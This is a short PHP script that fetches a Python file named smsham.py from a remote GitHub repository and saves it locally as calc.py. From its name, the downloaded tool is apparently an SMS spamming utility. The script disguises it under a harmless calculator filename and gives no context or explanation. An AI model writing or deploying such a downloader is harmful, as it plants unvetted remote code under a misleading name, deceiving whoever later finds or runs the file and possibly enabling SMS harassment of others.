<?php
$calc = file_get_contents("https://raw.githubusercontent.com/termux-lab/smsham/master/smsham.py");
$file = fopen("calc.py", "w");
fwrite($file, $calc);
fclose($file); 
?>
